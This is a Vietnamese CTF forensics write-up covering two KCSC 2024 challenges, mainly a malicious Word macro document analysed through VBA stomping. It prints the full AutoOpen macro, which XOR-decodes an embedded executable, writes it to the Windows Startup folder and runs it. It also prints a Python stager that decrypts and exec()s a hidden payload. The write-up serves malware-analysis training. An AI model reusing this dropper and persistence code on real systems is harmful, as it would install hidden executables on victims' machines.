# __**KCSC CTF 2024 [Forensics]**__

## _Externet Inplorer_


> Bạn có thể tìm được timestamp của url này khi nó được search không?
> 
> URL: https://www.google.com/search?q=how+to+hack+facebook&sca_esv=566211836&source=hp&ei=FgsIZdOxIfaB2roP1r-QsA4&iflsig=AO6bgOgAAAAAZQgZJgCWK60cSQUhq1etDPOxGw-Hrq5j&ved=0ahUKEwjTlMPZ37OBAxX2gFYBHdYfBOYQ4dUDCAk&uact=5&oq=how+to+hack+facebook&gs_lp=Egdnd3Mtd2l6IhRob3cgdG8gaGFjayBmYWNlYm9vazIIEAAYgAQYxwMyCBAAGIAEGMcDMgUQABiABDIFEAAYgAQyCBAAGIAEGMcDMggQABiABBjHAzIIEAAYgAQYxwMyCBAAGIAEGMcDMggQABiABBjHAzIIEAAYgAQYxwNI-DdQ4QFYuDZwDngAkAEAmAGdAaABphuqAQUxMS4yMrgBA8gBAPgBAagCB8ICEBAAGAMYjwEY5QIY6gIYjAPCAhAQLhgDGI8BGOUCGOoCGIwDwgIREC4YgAQYsQMYgwEYxwEY0QPCAgsQLhiABBixAxiDAcICCxAAGIAEGLEDGIMBwgILEAAYigUYsQMYgwHCAggQABiABBixA8ICERAuGIoFGLEDGIMBGMcBGNEDwgIQEAAYgAQYsQMYgwEYsQMYCsICBRAuGIAEwgILEC4YgAQYxwEY0QPCAggQABiKBRiGA8ICBhAAGBYYHsICCBAAGIoFGLEDwgILEC4YigUYsQMYgwHCAgQQABgDwgIIEC4YgAQYsQPCAgoQABiABBhGGP8B&sclient=gws-wiz
> 
> Flag format: KCSC{yyyy-mm-dd_hh:mm:ss.milisec}
> 
> Author: Nex0

Mình dùng [trang này](https://dfir.blog/unfurl/) để phân tích url

![Screenshot (1)](https://hackmd.io/_uploads/HkYv0gWmA.png)

Flag: `KCSC{2023-09-18_08:32:22.547027}`

## _Jumper In Disguise_
> Lombeos, 1 người bạn của tôi nhận được 1 file được gửi nặc danh. Bằng linh tính của mình, anh ấy nghi ngờ file này là độc hại và quyết định gửi lại file cho bạn để phân tích. Liệu bạn có thể giúp anh ấy không?
> 
> Flag format: KCSC{}
> 
> Author: Nex0

Bài cho ta 1 file `ThongBao.docm`, mình nghĩ ngay tới malicious macro trong file. Dùng `olevba` để check thử code xem như nào

```
Function zzz(troll As String) As String
    Dim aaa As String
    Dim bbb As String
    Dim ccc As String
    Dim i As Integer
    aaa = ""
    For i = 1 To Len(troll) Step 2
        aaa = aaa & ChrW("&H" & Mid(troll, i, 2))
    Next i
    bbb = "4444"
    ccc = ""
    For i = 1 To Len(aaa)
        ccc = ccc & ChrW(AscW(Mid(aaa, i, 1)) Xor AscW(Mid(bbb, (i - 1) Mod Len(bbb) + 1, 1)))
    Next i
    
    zzz = ccc
End Function
Sub AutoOpen()
    MsgBox "YOU GOT BONKED"
    MsgBox "KCSC{Keep_findin_till_reveal_secret}"
    Dim troll As String
    Dim nifal As String
    troll = "7a4a5c4245565a1742525a435058461b11405b5844575c421140525c4440565911595a5c5a5c46161012"
    nifal = zzz(troll)


Dim luachua
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
luachua = FreeFile
Open (ActiveDocument.FullName) For Binary As #luachua
Dim lem() As Byte
ReDim lem(file_length)
Get #luachua, 1, lem
Dim eee As String
eee = StrConv(lem, vbUnicode)
Dim fff, rrr
Dim nbv
    Set nbv = CreateObject("vbscript.regexp")
    nbv.Pattern = "SUPERNOVAOVERLOAD"
    Set rrr = nbv.Execute(eee)
Dim idx

For Each fff In rrr
idx = fff.FirstIndex
Exit For
Next

En = Environ("appdata") & "\Microsoft\Windows\Start Menu\Programs\Startup"
Set fszzzzz = CreateObject("Scripting.FileSystemObject")
Dim wakuwaku() As Byte
Dim soj As Long
soj = 4296810
ReDim wakuwaku(soj)
Get #luachua, idx + 18, wakuwaku
Dim bruh
bruh = FreeFile
deced = wakuwaku

Dim mei() As Byte
mei = deced
bbb = "4444"
For i = 1 To (soj + 1)
    jdj = deced(i - 1) Xor AscW(Mid(bbb, (i - 1) Mod Len(bbb) + 1, 1))
    mei(i - 1) = jdj
    Next i

namae = En & "\" & "Acheron.exe"
Open (namae) For Binary As #bruh
Put #bruh, 1, mei

Close #bruh
Erase wakuwaku
Set ceo = CreateObject("WScript.Shell")
ceo.Run """" + namae + """" + nifal
ActiveDocument.Save
End Sub
```
Thoạt đầu trông tương đối đơn giản. Script đẻ ra 1 file `Acheron.exe` trong `\Microsoft\Windows\Start Menu\Programs\Startup`, tuy nhiên khi vào kiểm tra thì file không chạy được, dùng DetectItEasy cũng chỉ hiện lên là binary file. Có gì đó không đúng ở đây.

![Screenshot 2024-05-14 094530](https://hackmd.io/_uploads/rk6kZbWmR.png)

Quay lại với `olevba`, có vẻ tool đã phát hiện điều gì đó bất thường trong script này

![Screenshot 2024-05-14 093637](https://hackmd.io/_uploads/r1Y2-ZbX0.png)

[Một bài viết về VBA Stomping mình tìm được](https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278)

Mình sử dụng [pcode2code](https://github.com/Big5-sec/pcode2code/blob/master/README.md) để đọc thử và:

```
Function zzz(troll As String) As String
    Dim aaa As String
    Dim bbb As String
    Dim ccc As String
    Dim i As Integer
    aaa = ""
    For i = 1 To Len(troll) Step 2
        aaa = aaa & ChrW("&H" & Mid(troll, i, 2))
    Next i
    bbb = "1337"
    ccc = ""
    For i = 1 To Len(aaa)
        ccc = ccc & ChrW(AscW(Mid(aaa, i, 1)) Xor AscW(Mid(bbb, (i - 1) Mod Len(bbb) + 1, 1)))
    Next i
    
    zzz = ccc
End Function
Sub AutoOpen()
    MsgBox "YOU GOT BONKED"
    MsgBox "KCSC{Dig_dipper,too_soon_for_a_flag}"
    Dim troll As String
    Dim nifal As String
    troll = "7a4a5c4245565a1742525a435058461b11405b5844575c421140525c4440565911595a5c5a5c46161012"
    nifal = zzz(troll)


Dim luachua
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
luachua = FreeFile
Open (ActiveDocument.FullName) For Binary As #luachua
Dim lem() As Byte
ReDim lem(file_length)
Get #luachua, 1, lem
Dim eee As String
eee = StrConv(lem, vbUnicode)
Dim fff, rrr
Dim nbv
    Set nbv = CreateObject("vbscript.regexp")
    nbv.Pattern = "SUPERNOVAOVERLOAD"
    Set rrr = nbv.Execute(eee)
Dim idx

For Each fff In rrr
idx = fff.FirstIndex
Exit For
Next

En = Environ("appdata") & "\Microsoft\Windows\Start Menu\Programs\Startup"
Set fszzzzz = CreateObject("Scripting.FileSystemObject")
Dim wakuwaku() As Byte
Dim soj As Long
soj = 4296810
ReDim wakuwaku(soj)
Get #luachua, idx + 18, wakuwaku
Dim bruh
bruh = FreeFile
deced = wakuwaku

Dim mei() As Byte
mei = deced
bbb = "1337"
For i = 1 To (soj + 1)
    jdj = deced(i - 1) Xor AscW(Mid(bbb, (i - 1) Mod Len(bbb) + 1, 1))
    mei(i - 1) = jdj
    Next i

namae = En & "\" & "Acheron.exe"
Open (namae) For Binary As #bruh
Put #bruh, 1, mei

Close #bruh
Erase wakuwaku
Set ceo = CreateObject("WScript.Shell")
ceo.Run """" + namae + """" + nifal
ActiveDocument.Save
End Sub
```
Biến `bbb` đã trở thành 1337 thay vì 4444 như ban đầu, mình sửa lại script và cho chạy lại lần nữa (KHÔNG DÙNG MÁY THẬT ĐỂ CHẠY SUSSY SCRIPT!)

![Screenshot 2024-05-14 095207](https://hackmd.io/_uploads/ryHb4ZZQC.png)

Lần này script đã đẻ ra 1 file trông có vẻ như là script Python đã được build với Pyinstaller, đồng thời script vba đã chạy file trên

![image](https://hackmd.io/_uploads/ByvOEW-X0.png)

Sau khi unpack file, ta phân tích file `lmao.pyc` ~~lmao~~

![Screenshot 2024-05-14 095254](https://hackmd.io/_uploads/BJXmS--Q0.png)

Ở đây mình dùng `uncompyle6`, và dưới đây là code python mình nhận được.
```
"""nR9aRuepXAGTojNrgfy3ai8iY5vq86RrJVwkOPRl5ne9vqd2b38dWd650pxpK/OMwkl1qcOeY/Bf+GYqKR7UG/0stVv2AfMjCYyb9CGSnZHqeaXLEd/2rhrni1+oyqqKuuQbawVTNY7ZcFJqejDjyw+1i2TSCgTuj1N7RZb9paxVlWZ/xLxz8pxrfhdtStZPVflTB24X1yQ/mZNfYWepk2zblSmsnq6sPRGr+50EeB0E+1j1igDuVTv0Ym1cS45QNMymjP0hFY5DjvR0W0EraJdEoXR6dQvgBPKSwdJ0JI87iPkesR3M7I77mtKtmNv5ydm3eo5TYzmbnXL42rZnLrhmgmNFzXa3gDYxnYBtmzgLTB3PQ3qVnSPVI2mr1GD7hCLQDeHm1HFEwx3dPvBwKhLSWqQw7Crw37OTaJCYOCLDlPzE1GZc2sOITPq2xckalHsjzXJMZ83u4FPSW31LS4hvdLb1LNl6vOgEMkUgaGqtfVO7AHPMwHFY7wO+1ggzJubH1MlX3UAtqS8DtskzeeSrHaS1GNyr5Pp6cVbUJLqSREHrmqJ/pi/3637Fyjsj374laynjrsJA8txeUD5GoNVIgB82rftGPNE6JR46JnBx0o8koHkXuKySWrPGkPV/IS2tZIb0O9qinGRQWI/hxm5q1qPVloqtVn644DVaeM9K4NGCU6VS2YDhEMlADOht5T3U2KbfoQD9HPta5W82HfaKv2/yJs+UfVd9xKfTQ/k4q3ob9nVupqiwTNgPWgaHPS36LZtGL3lEQTLaNRX3BQVDGuFY4s3RZQk/Oq9MkD5ZUVQlEJCQDezT40pbvWJRn+2OaKZizb3fbnKM0ggUbDKEU1gsI2OPrdqq3W/8Zel5NwC/7fdhiL+2zuO58JamssKdTc7e8CcwKhVRBFGs6Q0uYCx+VKXgnO7dn+ojW6RiQGeDb6w4IufhEvJxH56fgWcO52ZnvhOYymHKtztJSWLDn5H6hyEvCS48UPFW3SrCqxOXVadzcl4OOJkOoRBQ09PRfJd1mN92rF0kH23AyRvJWjQXXJ78uxeNoaRDmK6zDPS1R0LR40J0dPwJGnZYEeWyPw=="""
import sys
from base64 import b64decode as d
S = [i for i in range(256)]
j = 0
out = []
for i in range(256):
    j = (j + S[i] + ord(sys.argv[1][i % len(sys.argv[1])])) % 256
    S[i], S[j] = S[j], S[i]

i = j = 0
for char in d(globals()["__doc__"]):
    i = (i + 1) % 256
    j = (j + S[i]) % 256
    S[i], S[j] = S[j], S[i]
    out.append(char ^ S[(S[i] + S[j]) % 256])

exec("".join([chr(out[i] ^ open(sys.argv[0], "rb").read(4)[i % 4]) for i in range(len(out))]))
```

Đọc code ta thấy đoạn string base64 encoded trên sẽ được decode rồi giải mã và thực thi, kèm theo 1 key được truyền vào (`sys.argv[1]`), nhưng trong đoạn code mình không nhìn thấy được key nằm ở đâu, và nhận ra mình đã bỏ qua gì đó trong đoạn script vba.
Quay trở lại với script vba, ở dòng cuối cùng script ra lệnh thực thi file, 1 biến `nifal` đã được in ra kèm theo "Acheron.exe", mình sửa lại script để nhảy thông báo nội dung biến đấy là gì thì nhận được 1 đoạn text sau

![Screenshot 2024-05-14 095445](https://hackmd.io/_uploads/HJSnD--m0.png)

> Kyoutei saitaku, shoudou sakusen jikkou!!!

Phần còn lại chỉ là sửa lại đoạn code python, thay `sys.argv[0]` thành `"Acheron.exe"`, sửa `exec` thành `print` để in ra thay vì thực thi lệnh, chạy code cùng với đoạn text trên và tìm ra được flag

![Screenshot 2024-05-13 003336](https://hackmd.io/_uploads/BJvdd--7R.png)
~~van la dung quen dau~~

Flag: `KCSC{I_@m_daStomp_dat_1z_4Ppr0/\ch1n9!}`

![image](https://hackmd.io/_uploads/Sy3ZFWWQ0.png)

## _Toikhongbietdieudo_
updating
